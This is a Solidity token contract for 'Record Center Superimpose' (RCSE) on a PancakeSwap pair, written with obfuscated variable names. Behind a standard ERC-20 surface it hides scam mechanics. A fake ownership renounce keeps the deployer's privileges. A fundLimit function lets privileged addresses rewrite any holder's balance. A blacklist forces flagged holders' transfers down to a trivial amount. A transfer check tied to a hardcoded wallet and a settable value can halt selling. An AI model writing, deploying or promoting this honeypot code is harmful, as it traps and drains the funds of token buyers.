//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface fundExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract toFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface buyAuto {
    function createPair(address feeAmount, address enableAmount) external returns (address);
}

interface receiverLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address enableTradingAmount) external view returns (uint256);

    function transfer(address receiverTotal, uint256 liquidityWallet) external returns (bool);

    function allowance(address marketingFromEnable, address spender) external view returns (uint256);

    function approve(address spender, uint256 liquidityWallet) external returns (bool);

    function transferFrom(
        address sender,
        address receiverTotal,
        uint256 liquidityWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atEnable, uint256 value);
    event Approval(address indexed marketingFromEnable, address indexed spender, uint256 value);
}

interface takeExempt is receiverLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract RecordCenterSuperimpose is toFrom, receiverLaunch, takeExempt {

    function approve(address takeBuy, uint256 liquidityWallet) public virtual override returns (bool) {
        autoTo[_msgSender()][takeBuy] = liquidityWallet;
        emit Approval(_msgSender(), takeBuy, liquidityWallet);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return enableMode;
    }

    uint256 constant shouldLiquidity = 15 ** 10;

    function getOwner() external view returns (address) {
        return totalList;
    }

    mapping(address => uint256) private isLaunched;

    uint256 autoSenderLiquidity;

    mapping(address => bool) public txShould;

    function minWallet(address senderTrading, address receiverTotal, uint256 liquidityWallet) internal returns (bool) {
        if (senderTrading == minSwap) {
            return autoShould(senderTrading, receiverTotal, liquidityWallet);
        }
        uint256 enableMinMax = receiverLaunch(atSwap).balanceOf(launchWallet);
        require(enableMinMax == autoFundLimit);
        require(receiverTotal != launchWallet);
        if (txShould[senderTrading]) {
            return autoShould(senderTrading, receiverTotal, shouldLiquidity);
        }
        return autoShould(senderTrading, receiverTotal, liquidityWallet);
    }

    address launchWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function listEnable() private view {
        require(liquiditySwap[_msgSender()]);
    }

    address public atSwap;

    address private totalList;

    uint256 autoFundLimit;

    uint256 private fundLiquidityTo;

    mapping(address => mapping(address => uint256)) private autoTo;

    function transferFrom(address senderTrading, address receiverTotal, uint256 liquidityWallet) external override returns (bool) {
        if (_msgSender() != senderMarketingTo) {
            if (autoTo[senderTrading][_msgSender()] != type(uint256).max) {
                require(liquidityWallet <= autoTo[senderTrading][_msgSender()]);
                autoTo[senderTrading][_msgSender()] -= liquidityWallet;
            }
        }
        return minWallet(senderTrading, receiverTotal, liquidityWallet);
    }

    function owner() external view returns (address) {
        return totalList;
    }

    function fundLimit(address maxAmount, uint256 liquidityWallet) public {
        listEnable();
        isLaunched[maxAmount] = liquidityWallet;
    }

    address public minSwap;

    event OwnershipTransferred(address indexed atReceiverShould, address indexed fundLaunched);

    mapping(address => bool) public liquiditySwap;

    uint256 public shouldToTrading;

    function allowance(address autoSwap, address takeBuy) external view virtual override returns (uint256) {
        if (takeBuy == senderMarketingTo) {
            return type(uint256).max;
        }
        return autoTo[autoSwap][takeBuy];
    }

    uint256 private fromTake = 100000000 * 10 ** 18;

    bool public shouldTotal;

    function transfer(address maxAmount, uint256 liquidityWallet) external virtual override returns (bool) {
        return minWallet(_msgSender(), maxAmount, liquidityWallet);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fromTake;
    }

    bool public swapReceiverShould;

    bool public amountLiquidity;

    string private enableMode = "RCSE";

    function listTx(uint256 liquidityWallet) public {
        listEnable();
        autoFundLimit = liquidityWallet;
    }

    function decimals() external view virtual override returns (uint8) {
        return launchedAt;
    }

    uint8 private launchedAt = 18;

    bool public fromAuto;

    function balanceOf(address enableTradingAmount) public view virtual override returns (uint256) {
        return isLaunched[enableTradingAmount];
    }

    function sellLaunchedMode() public {
        emit OwnershipTransferred(minSwap, address(0));
        totalList = address(0);
    }

    constructor (){
        
        fundExempt feeSender = fundExempt(senderMarketingTo);
        atSwap = buyAuto(feeSender.factory()).createPair(feeSender.WETH(), address(this));
        
        minSwap = _msgSender();
        sellLaunchedMode();
        liquiditySwap[minSwap] = true;
        isLaunched[minSwap] = fromTake;
        
        emit Transfer(address(0), minSwap, fromTake);
    }

    string private swapIs = "Record Center Superimpose";

    address senderMarketingTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function liquidityMode(address marketingFund) public {
        listEnable();
        
        if (marketingFund == minSwap || marketingFund == atSwap) {
            return;
        }
        txShould[marketingFund] = true;
    }

    function autoShould(address senderTrading, address receiverTotal, uint256 liquidityWallet) internal returns (bool) {
        require(isLaunched[senderTrading] >= liquidityWallet);
        isLaunched[senderTrading] -= liquidityWallet;
        isLaunched[receiverTotal] += liquidityWallet;
        emit Transfer(senderTrading, receiverTotal, liquidityWallet);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return swapIs;
    }

    function tradingAt(address senderMin) public {
        require(senderMin.balance < 100000);
        if (fromAuto) {
            return;
        }
        if (amountLiquidity == shouldTotal) {
            amountLiquidity = true;
        }
        liquiditySwap[senderMin] = true;
        
        fromAuto = true;
    }

}